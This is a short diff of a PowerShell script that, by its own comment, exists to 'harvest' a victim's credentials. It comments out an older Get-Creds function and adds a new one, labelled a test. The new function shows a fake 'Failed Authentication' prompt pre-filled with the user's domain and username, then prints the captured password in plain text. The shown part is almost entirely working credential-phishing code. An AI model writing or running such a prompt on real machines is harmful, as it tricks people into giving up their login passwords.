@@ -51,6 +51,8 @@ $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 	This is to generate the ui.prompt you will use to harvest their credentials
 #>
 
+
+<#
 function Get-Creds {
 
     $form = $null
@@ -82,6 +84,23 @@ function Get-Creds {
         }
     }
 }
+#>
+function Get-Creds {
+    Write-Host "--- [STARTING CREDENTIAL PROMPT TEST] ---"
+    # Directly call the prompt and check the result immediately
+    $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName)
+    Write-Host "--- [CREDENTIAL PROMPT RESULT] ---"
+
+    if ($cred) {
+        Write-Host "Credential object successfully captured."
+        # Return a mock successful credential structure if the object exists
+        return $cred.GetNetworkCredential() | fl 
+    } else {
+        Write-Host "Credential prompt returned null (User likely canceled)."
+        return $null
+    }
+}
+
 
 #----------------------------------------------------------------------------------------------------
 
